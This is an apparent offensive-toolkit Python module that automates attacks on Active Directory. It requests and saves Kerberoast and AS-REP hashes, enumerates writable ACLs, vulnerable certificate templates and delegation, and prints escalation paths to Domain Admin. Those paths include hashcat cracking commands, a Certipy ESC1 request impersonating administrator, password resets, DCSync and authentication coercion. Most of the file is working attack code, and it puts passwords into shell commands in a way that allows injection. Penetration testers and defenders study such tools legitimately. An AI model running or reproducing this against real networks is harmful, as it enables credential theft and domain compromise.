"""
AD Attack Surface Enumeration Module
Comprehensive enumeration for AD attack paths including:
- Kerberoasting
- ASREPRoasting
- ACL Abuse (BloodyAD)
- AD CS Vulnerabilities (Certipy)
- Attack Path Detection

Based on attack chain: Kerberoast -> ACL Abuse -> Targeted Kerberoast -> ESC1 -> Domain Admin
"""

import os
import re
import json
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from core.module_base import ModuleBase, ModuleType, Platform, find_tool
from core.colors import Colors


class ADAttackEnum(ModuleBase):
    """
    Comprehensive AD attack surface enumeration.
    Automatically discovers attack paths to Domain Admin.

    Runs:
    1. Kerberoasting - find crackable service accounts
    2. ASREPRoasting - find accounts without preauth
    3. ACL Enumeration - find writable objects and dangerous permissions
    4. AD CS Enumeration - find certificate template vulnerabilities
    5. Attack Path Analysis - identify escalation paths
    """

    def __init__(self):
        super().__init__()
        self.name = "ad_attack_enum"
        self.description = "Comprehensive AD attack surface enumeration with attack path detection"
        self.author = "UwU Toolkit"
        self.version = "1.0.0"
        self.module_type = ModuleType.AUXILIARY
        self.platform = Platform.WINDOWS
        self.tags = ["ad", "enumeration", "kerberoast", "asreproast", "acl", "adcs",
                     "certipy", "bloodyad", "attack-path", "comprehensive"]
        self.references = [
            "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology",
            "https://github.com/ly4k/Certipy",
            "https://github.com/CravateRouge/bloodyAD",
            "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
        ]

        # Core options
        self.register_option("RHOSTS", "Domain Controller IP", required=True)
        self.register_option("DOMAIN", "Domain name", required=True)
        self.register_option("USER", "Domain username", required=True)
        self.register_option("PASS", "Domain password", required=True)

        # Enumeration options
        self.register_option("ENUM_KERBEROAST", "Run Kerberoasting", default="yes", choices=["yes", "no"])
        self.register_option("ENUM_ASREPROAST", "Run ASREPRoasting", default="yes", choices=["yes", "no"])
        self.register_option("ENUM_ACL", "Run ACL enumeration (BloodyAD)", default="yes", choices=["yes", "no"])
        self.register_option("ENUM_ADCS", "Run AD CS enumeration (Certipy)", default="yes", choices=["yes", "no"])
        self.register_option("ENUM_DELEGATION", "Check delegation settings", default="yes", choices=["yes", "no"])

        # Output
        self.register_option("OUTPUT_DIR", "Output directory for results", default="./ad_attack_enum")

        # Container
        self.register_option("EXEGOL_CONTAINER", "Exegol container (auto-detect if empty)", default="")

        # Store findings for attack path analysis
        self.findings = {
            "kerberoastable": [],
            "asreproastable": [],
            "writable_objects": [],
            "dangerous_acls": [],
            "adcs_vulns": [],
            "delegation": [],
            "attack_paths": []
        }

    def run(self) -> bool:
        dc_ip = self.get_option("RHOSTS")
        domain = self.get_option("DOMAIN")
        user = self.get_option("USER")
        password = self.get_option("PASS")
        output_dir = self.get_option("OUTPUT_DIR")

        # Create output directory
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_dir = f"{output_dir}/{domain.replace('.', '_')}_{timestamp}"
        os.makedirs(output_dir, exist_ok=True)

        self._print_banner()
        self.print_status(f"Target DC: {dc_ip}")
        self.print_status(f"Domain: {domain}")
        self.print_status(f"User: {user}")
        self.print_status(f"Output: {output_dir}")
        self.print_line()

        success_count = 0
        total_count = 0

        # 1. Kerberoasting
        if self.get_option("ENUM_KERBEROAST") == "yes":
            total_count += 1
            if self._enum_kerberoast(dc_ip, domain, user, password, output_dir):
                success_count += 1

        # 2. ASREPRoasting
        if self.get_option("ENUM_ASREPROAST") == "yes":
            total_count += 1
            if self._enum_asreproast(dc_ip, domain, user, password, output_dir):
                success_count += 1

        # 3. ACL Enumeration (BloodyAD)
        if self.get_option("ENUM_ACL") == "yes":
            total_count += 1
            if self._enum_acl(dc_ip, domain, user, password, output_dir):
                success_count += 1

        # 4. AD CS Enumeration (Certipy)
        if self.get_option("ENUM_ADCS") == "yes":
            total_count += 1
            if self._enum_adcs(dc_ip, domain, user, password, output_dir):
                success_count += 1

        # 5. Delegation Enumeration
        if self.get_option("ENUM_DELEGATION") == "yes":
            total_count += 1
            if self._enum_delegation(dc_ip, domain, user, password, output_dir):
                success_count += 1

        # Analyze attack paths
        self._analyze_attack_paths()

        # Print findings summary
        self._print_findings_summary(output_dir)

        # Save results
        self._save_results(output_dir)

        return success_count > 0

    def _enum_kerberoast(self, dc_ip: str, domain: str, user: str,
                         password: str, output_dir: str) -> bool:
        """Enumerate Kerberoastable accounts"""
        self.print_line()
        self.print_good("=" * 60)
        self.print_good("  [1/5] KERBEROASTING ENUMERATION")
        self.print_good("=" * 60)

        output_file = f"{output_dir}/kerberoast_hashes.txt"
        cmd = f"GetUserSPNs.py '{domain}/{user}:{password}' -dc-ip {dc_ip} -request -outputfile {output_file}"

        self.print_status(f"Command: GetUserSPNs.py {domain}/{user}:[HIDDEN] -dc-ip {dc_ip} -request")

        ret, stdout, stderr = self.run_in_exegol(cmd, timeout=120)
        output = stdout + stderr

        # Parse results
        spn_users = []
        for line in output.split('\n'):
            if line.strip() and not line.startswith('[') and not line.startswith('-'):
                parts = line.split()
                if len(parts) >= 2 and '/' in parts[0]:
                    # SPN line: ServicePrincipalName  Name  ...
                    continue
                elif len(parts) >= 1 and not parts[0].startswith('Impacket'):
                    # This might be a user entry
                    match = re.search(r'(\S+)\s+(\S+)\s+', line)
                    if match and '/' in line:
                        spn = match.group(1)
                        name = match.group(2) if match.group(2) else "unknown"
                        if not spn.startswith('[') and not spn.startswith('-'):
                            spn_users.append({"spn": spn, "name": name, "line": line.strip()})

        # Also check output file
        if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
            with open(output_file, 'r') as f:
                hash_count = sum(1 for line in f if line.strip() and line.startswith('$krb5tgs$'))

            self.print_line()
            self.print_good(f"  {Colors.HIGH}KERBEROASTABLE ACCOUNTS FOUND!{Colors.RESET}")
            self.print_good(f"  Hashes captured: {hash_count}")
            self.print_good(f"  Output: {output_file}")
            self.print_status(f"  Crack: hashcat -m 13100 {output_file} wordlist.txt")

            # Parse usernames from output
            for line in output.split('\n'):
                if 'ServicePrincipalName' not in line and '/' in line and 'Impacket' not in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        self.findings["kerberoastable"].append({
                            "spn": parts[0],
                            "user": parts[1] if len(parts) > 1 else "unknown"
                        })
                        self.print_status(f"    - {parts[1] if len(parts) > 1 else parts[0]}")

            return True
        else:
            self.print_status("  No Kerberoastable accounts found")
            return True

    def _enum_asreproast(self, dc_ip: str, domain: str, user: str,
                         password: str, output_dir: str) -> bool:
        """Enumerate ASREPRoastable accounts"""
        self.print_line()
        self.print_good("=" * 60)
        self.print_good("  [2/5] ASREPROASTING ENUMERATION")
        self.print_good("=" * 60)

        output_file = f"{output_dir}/asrep_hashes.txt"
        cmd = f"GetNPUsers.py '{domain}/{user}:{password}' -dc-ip {dc_ip} -request -outputfile {output_file}"

        self.print_status(f"Command: GetNPUsers.py {domain}/{user}:[HIDDEN] -dc-ip {dc_ip} -request")

        ret, stdout, stderr = self.run_in_exegol(cmd, timeout=120)
        output = stdout + stderr

        # Check output file
        if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
            with open(output_file, 'r') as f:
                hash_count = sum(1 for line in f if line.strip() and '$krb5asrep$' in line)

            if hash_count > 0:
                self.print_line()
                self.print_good(f"  {Colors.HIGH}ASREPROASTABLE ACCOUNTS FOUND!{Colors.RESET}")
                self.print_good(f"  Hashes captured: {hash_count}")
                self.print_good(f"  Output: {output_file}")
                self.print_status(f"  Crack: hashcat -m 18200 {output_file} wordlist.txt")

                # Parse usernames
                for line in output.split('\n'):
                    if 'UF_DONT_REQUIRE_PREAUTH' in line or '$krb5asrep$' in line:
                        match = re.search(r'(\w+)@', line)
                        if match:
                            self.findings["asreproastable"].append({"user": match.group(1)})
                            self.print_status(f"    - {match.group(1)}")

                return True

        self.print_status("  No ASREPRoastable accounts found")
        return True

    def _enum_acl(self, dc_ip: str, domain: str, user: str,
                  password: str, output_dir: str) -> bool:
        """Enumerate ACLs using BloodyAD"""
        self.print_line()
        self.print_good("=" * 60)
        self.print_good("  [3/5] ACL ENUMERATION (BloodyAD)")
        self.print_good("=" * 60)

        cmd = f"bloodyAD -u '{user}' -p '{password}' -d {domain} --host {dc_ip} get writable --detail"

        self.print_status(f"Command: bloodyAD -u {user} -p [HIDDEN] -d {domain} --host {dc_ip} get writable --detail")

        ret, stdout, stderr = self.run_in_exegol(cmd, timeout=180)
        output = stdout + stderr

        # Save raw output
        output_file = f"{output_dir}/acl_writable.txt"
        with open(output_file, 'w') as f:
            f.write(output)

        # Parse writable objects
        current_dn = None
        current_perms = []

        dangerous_perms = ['GenericAll', 'GenericWrite', 'WriteDacl', 'WriteOwner',
                          'ForceChangePassword', 'OWNER', 'DACL', 'unicodePwd',
                          'servicePrincipalName', 'msDS-AllowedToActOnBehalfOfOtherIdentity']

        for line in output.split('\n'):
            stripped = line.strip()

            if stripped.startswith('distinguishedName:'):
                if current_dn and current_perms:
                    # Check if any dangerous permissions
                    has_dangerous = any(perm in str(current_perms) for perm in dangerous_perms)
                    if has_dangerous:
                        # Extract CN from DN
                        cn_match = re.search(r'CN=([^,]+)', current_dn)
                        cn = cn_match.group(1) if cn_match else current_dn

                        self.findings["writable_objects"].append({
                            "dn": current_dn,
                            "cn": cn,
                            "permissions": current_perms
                        })

                current_dn = stripped.split(':', 1)[1].strip()
                current_perms = []

            elif ':' in stripped and current_dn:
                perm_type = stripped.split(':')[0].strip()
                perm_value = stripped.split(':')[1].strip() if ':' in stripped else ''
                if perm_value in ['WRITE', 'CREATE_CHILD', 'DELETE', 'FULL_CONTROL']:
                    current_perms.append(f"{perm_type}: {perm_value}")

        # Process last entry
        if current_dn and current_perms:
            has_dangerous = any(perm in str(current_perms) for perm in dangerous_perms)
            if has_dangerous:
                cn_match = re.search(r'CN=([^,]+)', current_dn)
                cn = cn_match.group(1) if cn_match else current_dn
                self.findings["writable_objects"].append({
                    "dn": current_dn,
                    "cn": cn,
                    "permissions": current_perms
                })

        # Print findings
        if self.findings["writable_objects"]:
            self.print_line()
            self.print_good(f"  {Colors.HIGH}WRITABLE OBJECTS FOUND!{Colors.RESET}")
            self.print_good(f"  Total: {len(self.findings['writable_objects'])} objects with dangerous permissions")

            for obj in self.findings["writable_objects"][:10]:  # Show first 10
                cn = obj.get("cn", "Unknown")
                # Check for specific dangerous permissions
                perms_str = str(obj.get("permissions", []))

                if "unicodePwd" in perms_str or "OWNER" in perms_str or "DACL" in perms_str:
                    self.print_good(f"    {Colors.CRITICAL}[FULL CONTROL]{Colors.RESET} {cn}")
                    self.print_status(f"      -> Can reset password, modify ACLs, take ownership")
                elif "servicePrincipalName" in perms_str:
                    self.print_good(f"    {Colors.HIGH}[WRITE SPN]{Colors.RESET} {cn}")
                    self.print_status(f"      -> Can add SPN for targeted Kerberoasting")
                elif "msDS-AllowedToActOnBehalfOfOtherIdentity" in perms_str:
                    self.print_good(f"    {Colors.HIGH}[RBCD]{Colors.RESET} {cn}")
                    self.print_status(f"      -> Can configure Resource-Based Constrained Delegation")
                else:
                    self.print_status(f"    [WRITE] {cn}")

            if len(self.findings["writable_objects"]) > 10:
                self.print_status(f"    ... and {len(self.findings['writable_objects']) - 10} more")

            self.print_line()
            self.print_status(f"  Full output: {output_file}")
            return True
        else:
            self.print_status("  No dangerous ACL permissions found for current user")
            return True

    def _enum_adcs(self, dc_ip: str, domain: str, user: str,
                   password: str, output_dir: str) -> bool:
        """Enumerate AD CS vulnerabilities using Certipy"""
        self.print_line()
        self.print_good("=" * 60)
        self.print_good("  [4/5] AD CS ENUMERATION (Certipy)")
        self.print_good("=" * 60)

        certipy_path = "/root/.local/share/pipx/venvs/netexec/bin/certipy"
        cmd = f"{certipy_path} find -u '{user}@{domain}' -p '{password}' -dc-ip {dc_ip} -stdout -vulnerable"

        self.print_status(f"Command: certipy find -u {user}@{domain} -p [HIDDEN] -dc-ip {dc_ip} -vulnerable")

        ret, stdout, stderr = self.run_in_exegol(cmd, timeout=180)
        output = stdout + stderr

        # Save raw output
        output_file = f"{output_dir}/adcs_certipy.txt"
        with open(output_file, 'w') as f:
            f.write(output)

        # Parse vulnerabilities
        current_template = None
        current_ca = None

        for line in output.split('\n'):
            stripped = line.strip()

            if "CA Name" in line and ":" in line:
                current_ca = line.split(":", 1)[1].strip()

            if "Template Name" in line and ":" in line:
                current_template = line.split(":", 1)[1].strip()

            # Check for vulnerabilities
            if "ESC" in stripped and current_template:
                vuln_match = re.search(r'(ESC\d+)', stripped)
                if vuln_match:
                    vuln_type = vuln_match.group(1)
                    self.findings["adcs_vulns"].append({
                        "template": current_template,
                        "ca": current_ca,
                        "vulnerability": vuln_type,
                        "line": stripped
                    })

        # Print findings
        if self.findings["adcs_vulns"]:
            self.print_line()
            self.print_good(f"  {Colors.CRITICAL}AD CS VULNERABILITIES FOUND!{Colors.RESET}")

            for vuln in self.findings["adcs_vulns"]:
                vuln_type = vuln.get("vulnerability", "Unknown")
                template = vuln.get("template", "Unknown")
                ca = vuln.get("ca", "Unknown")

                if vuln_type == "ESC1":
                    self.print_good(f"    {Colors.CRITICAL}[{vuln_type}]{Colors.RESET} Template: {template}")
                    self.print_status(f"      CA: {ca}")
                    self.print_status(f"      -> Enrollee can supply subject (impersonate ANY user)")
                    self.print_status(f"      -> Exploit: certipy req -u USER -p PASS -ca {ca} -template {template} -upn administrator@{domain}")
                elif vuln_type == "ESC2":
                    self.print_good(f"    {Colors.HIGH}[{vuln_type}]{Colors.RESET} Template: {template}")
                    self.print_status(f"      -> Any Purpose EKU or no EKU")
                elif vuln_type == "ESC3":
                    self.print_good(f"    {Colors.HIGH}[{vuln_type}]{Colors.RESET} Template: {template}")
                    self.print_status(f"      -> Enrollment Agent template")
                elif vuln_type == "ESC4":
                    self.print_good(f"    {Colors.HIGH}[{vuln_type}]{Colors.RESET} Template: {template}")
                    self.print_status(f"      -> Vulnerable template ACLs")
                elif vuln_type == "ESC8":
                    self.print_good(f"    {Colors.HIGH}[{vuln_type}]{Colors.RESET} Web Enrollment")
                    self.print_status(f"      -> NTLM relay to CA web enrollment")
                else:
                    self.print_good(f"    [{vuln_type}] Template: {template}")

            self.print_line()
            self.print_status(f"  Full output: {output_file}")
            return True
        else:
            self.print_status("  No AD CS vulnerabilities found")
            return True

    def _enum_delegation(self, dc_ip: str, domain: str, user: str,
                         password: str, output_dir: str) -> bool:
        """Enumerate delegation settings"""
        self.print_line()
        self.print_good("=" * 60)
        self.print_good("  [5/5] DELEGATION ENUMERATION")
        self.print_good("=" * 60)

        # Build base DN
        base_dn = ",".join([f"DC={part}" for part in domain.split(".")])

        # Check unconstrained delegation
        cmd = f"ldapsearch -x -H ldap://{dc_ip} -D '{user}@{domain}' -w '{password}' -b '{base_dn}' '(userAccountControl:1.2.840.113556.1.4.803:=524288)' cn dNSHostName"

        ret, stdout, stderr = self.run_in_exegol(cmd, timeout=60)
        output = stdout + stderr

        unconstrained = []
        for line in output.split('\n'):
            if line.startswith('cn:') or line.startswith('dNSHostName:'):
                value = line.split(':', 1)[1].strip()
                if value and value not in unconstrained:
                    unconstrained.append(value)

        if unconstrained:
            self.print_good(f"  {Colors.HIGH}UNCONSTRAINED DELEGATION FOUND!{Colors.RESET}")
            for item in unconstrained:
                self.print_status(f"    - {item}")
                self.findings["delegation"].append({"type": "unconstrained", "target": item})

        # Check constrained delegation
        cmd = f"ldapsearch -x -H ldap://{dc_ip} -D '{user}@{domain}' -w '{password}' -b '{base_dn}' '(msDS-AllowedToDelegateTo=*)' sAMAccountName msDS-AllowedToDelegateTo"

        ret, stdout, stderr = self.run_in_exegol(cmd, timeout=60)
        output = stdout + stderr

        if "msDS-AllowedToDelegateTo:" in output:
            self.print_good(f"  {Colors.MEDIUM}CONSTRAINED DELEGATION FOUND{Colors.RESET}")
            current_account = None
            for line in output.split('\n'):
                if line.startswith('sAMAccountName:'):
                    current_account = line.split(':', 1)[1].strip()
                elif line.startswith('msDS-AllowedToDelegateTo:') and current_account:
                    target = line.split(':', 1)[1].strip()
                    self.print_status(f"    - {current_account} -> {target}")
                    self.findings["delegation"].append({
                        "type": "constrained",
                        "account": current_account,
                        "target": target
                    })

        if not self.findings["delegation"]:
            self.print_status("  No dangerous delegation settings found")

        return True

    def _analyze_attack_paths(self) -> None:
        """Analyze findings to identify attack paths"""
        self.print_line()
        self.print_good("=" * 60)
        self.print_good("  ATTACK PATH ANALYSIS")
        self.print_good("=" * 60)

        paths = []

        # Path 1: Kerberoast -> Crack -> Check ACLs
        if self.findings["kerberoastable"]:
            for kerb in self.findings["kerberoastable"]:
                path = {
                    "name": f"Kerberoast {kerb.get('user', 'unknown')}",
                    "steps": [
                        f"1. Crack TGS hash for {kerb.get('user', 'unknown')}",
                        f"2. Use credentials to enumerate ACLs",
                        f"3. Check for writable objects or AD CS access"
                    ],
                    "risk": "HIGH",
                    "module": "auxiliary/ad/kerberoast"
                }
                paths.append(path)

        # Path 2: ACL Abuse -> Password Reset or SPN Set
        for obj in self.findings["writable_objects"]:
            perms_str = str(obj.get("permissions", []))
            cn = obj.get("cn", "Unknown")

            if "unicodePwd" in perms_str or "OWNER" in perms_str:
                path = {
                    "name": f"ACL Abuse: Reset {cn}'s password",
                    "steps": [
                        f"1. Use bloody_setpass to reset {cn}'s password",
                        f"2. Authenticate as {cn}",
                        f"3. Enumerate new attack surface"
                    ],
                    "risk": "CRITICAL",
                    "module": "auxiliary/ad/bloody_setpass",
                    "command": f"set TARGET_USER {cn}"
                }
                paths.append(path)

            if "servicePrincipalName" in perms_str:
                path = {
                    "name": f"Targeted Kerberoast: Add SPN to {cn}",
                    "steps": [
                        f"1. Use bloody_spn to add SPN to {cn}",
                        f"2. Kerberoast the new SPN",
                        f"3. Crack and use credentials"
                    ],
                    "risk": "HIGH",
                    "module": "auxiliary/ad/bloody_spn",
                    "command": f"set TARGET_USER {cn}"
                }
                paths.append(path)

        # Path 3: AD CS ESC1 -> Domain Admin
        for vuln in self.findings["adcs_vulns"]:
            if vuln.get("vulnerability") == "ESC1":
                path = {
                    "name": f"ESC1: Impersonate Domain Admin via {vuln.get('template')}",
                    "steps": [
                        f"1. Use certipy_exploit with template {vuln.get('template')}",
                        f"2. Request certificate for Administrator/Domain Admin",
                        f"3. Authenticate with certificate to get NT hash",
                        f"4. DCSync all domain credentials"
                    ],
                    "risk": "CRITICAL",
                    "module": "auxiliary/ad/certipy_exploit",
                    "command": f"set TEMPLATE {vuln.get('template')}; set CA {vuln.get('ca')}; set TARGET_USER Administrator"
                }
                paths.append(path)

        # Path 4: Unconstrained Delegation
        for deleg in self.findings["delegation"]:
            if deleg.get("type") == "unconstrained":
                path = {
                    "name": f"Unconstrained Delegation: {deleg.get('target')}",
                    "steps": [
                        f"1. Compromise {deleg.get('target')}",
                        f"2. Coerce authentication from DC (PrinterBug/PetitPotam)",
                        f"3. Capture TGT and impersonate DC"
                    ],
                    "risk": "HIGH",
                    "module": "N/A - requires host compromise"
                }
                paths.append(path)

        self.findings["attack_paths"] = paths

        # Print attack paths
        if paths:
            self.print_line()
            self.print_good(f"  {Colors.CRITICAL}IDENTIFIED {len(paths)} ATTACK PATH(S){Colors.RESET}")
            self.print_line()

            for i, path in enumerate(paths, 1):
                risk_color = Colors.CRITICAL if path["risk"] == "CRITICAL" else Colors.HIGH
                self.print_good(f"  [{i}] {risk_color}[{path['risk']}]{Colors.RESET} {path['name']}")

                for step in path["steps"]:
                    self.print_status(f"      {step}")

                if "module" in path:
                    self.print_status(f"      Module: {path['module']}")
                if "command" in path:
                    self.print_status(f"      Setup: {path['command']}")

                self.print_line()
        else:
            self.print_status("  No clear attack paths identified with current user privileges")
            self.print_status("  Try: Crack Kerberoast hashes and re-run with new credentials")

    def _print_findings_summary(self, output_dir: str) -> None:
        """Print summary of all findings"""
        self.print_line()
        self.print_good("=" * 60)
        self.print_good("  FINDINGS SUMMARY")
        self.print_good("=" * 60)

        self.print_status(f"  Kerberoastable accounts: {len(self.findings['kerberoastable'])}")
        self.print_status(f"  ASREPRoastable accounts: {len(self.findings['asreproastable'])}")
        self.print_status(f"  Writable objects: {len(self.findings['writable_objects'])}")
        self.print_status(f"  AD CS vulnerabilities: {len(self.findings['adcs_vulns'])}")
        self.print_status(f"  Delegation issues: {len(self.findings['delegation'])}")
        self.print_status(f"  Attack paths identified: {len(self.findings['attack_paths'])}")
        self.print_line()
        self.print_status(f"  Results saved to: {output_dir}")

    def _save_results(self, output_dir: str) -> None:
        """Save all results to JSON"""
        output_file = f"{output_dir}/attack_enum_results.json"

        results = {
            "timestamp": datetime.now().isoformat(),
            "target": self.get_option("RHOSTS"),
            "domain": self.get_option("DOMAIN"),
            "user": self.get_option("USER"),
            "findings": self.findings
        }

        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2, default=str)

        self.print_good(f"  JSON results: {output_file}")

    def _print_banner(self) -> None:
        """Print module banner"""
        banner = f"""
{Colors.BRIGHT_CYAN}
╔══════════════════════════════════════════════════════════════════╗
║{Colors.BRIGHT_YELLOW}     _   ___    _  _____ _____  _    ____ _  __              {Colors.BRIGHT_CYAN}║
║{Colors.BRIGHT_YELLOW}    / \\ |   \\  / \\|_   _|_   _|/ \\  / ___| |/ /              {Colors.BRIGHT_CYAN}║
║{Colors.BRIGHT_YELLOW}   / _ \\| |) |/ _ \\ | |   | | / _ \\| |   | ' /               {Colors.BRIGHT_CYAN}║
║{Colors.BRIGHT_YELLOW}  / ___ \\  __/ ___ \\| |   | |/ ___ \\ |___| . \\               {Colors.BRIGHT_CYAN}║
║{Colors.BRIGHT_YELLOW} /_/   \\_\\_| /_/   \\_\\_|   |_/_/   \\_\\____|_|\\_\\              {Colors.BRIGHT_CYAN}║
║                                                                  ║
║{Colors.BRIGHT_WHITE}     AD Attack Surface Enumeration - Find Your Path to DA      {Colors.BRIGHT_CYAN}║
╚══════════════════════════════════════════════════════════════════╝
{Colors.RESET}
{Colors.DIM}Enumerates: Kerberoast | ASREProast | ACLs | AD CS | Delegation{Colors.RESET}
"""
        self.print_line(banner)

    def check(self) -> bool:
        """Check if required tools are available"""
        # Check Exegol container
        ret, stdout, stderr = self.run_in_exegol("which bloodyAD", timeout=10)
        if ret != 0:
            self.print_warning("BloodyAD not found in Exegol - ACL enumeration will fail")

        ret, stdout, stderr = self.run_in_exegol("ls /root/.local/share/pipx/venvs/netexec/bin/certipy", timeout=10)
        if ret != 0:
            self.print_warning("Certipy not found in Exegol - AD CS enumeration will fail")

        return True
